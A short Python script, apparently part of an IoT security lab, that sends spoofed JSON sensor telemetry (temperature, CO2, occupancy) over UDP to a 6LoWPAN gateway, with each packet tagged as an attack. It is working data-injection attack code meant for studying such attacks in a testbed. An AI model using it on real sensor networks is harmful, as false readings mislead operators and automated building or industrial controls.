#!/usr/bin/env python3
import argparse
import json
import socket
from datetime import datetime, timezone


def utc_now():
    return datetime.now(timezone.utc).isoformat()


def main():
    parser = argparse.ArgumentParser(description="Send spoofed JSON telemetry into the 6LoWPAN UDP path.")
    parser.add_argument("--source", default=None, help="Optional source IPv6 address to bind.")
    parser.add_argument("--dest", default="fd00:6:3::2", help="Gateway receiver IPv6 address.")
    parser.add_argument("--port", type=int, default=9999, help="Gateway receiver UDP port.")
    parser.add_argument("--sensor-id", default="temp-01", help="sensor_id field expected by the current gateway.")
    parser.add_argument("--node-id", default="sensor-1", help="node_id field for Milestone 9 notes.")
    parser.add_argument("--temperature", type=float, default=39.5)
    parser.add_argument("--humidity", type=float, default=None)
    parser.add_argument("--co2", type=float, default=None)
    parser.add_argument("--air-quality", type=float, default=None)
    parser.add_argument("--occupancy", default=None)
    parser.add_argument("--unit", default="C")
    parser.add_argument("--attack", default="spoofed")
    parser.add_argument("--timestamp", default=None)
    args = parser.parse_args()

    reading = {
        "sensor_id": args.sensor_id,
        "node_id": args.node_id,
        "temperature": args.temperature,
        "unit": args.unit,
        "attack": args.attack,
        "timestamp": args.timestamp or utc_now(),
    }

    if args.humidity is not None:
        reading["humidity"] = args.humidity
    if args.co2 is not None:
        reading["co2"] = args.co2
    if args.air_quality is not None:
        reading["air_quality"] = args.air_quality
    if args.occupancy is not None:
        reading["occupancy"] = args.occupancy

    payload = json.dumps(reading, separators=(",", ":")).encode("utf-8")

    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    if args.source:
        sock.bind((args.source, 0))

    sock.sendto(payload, (args.dest, args.port))
    print(f"sent spoofed telemetry to [{args.dest}]:{args.port}")
    print(json.dumps(reading, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()

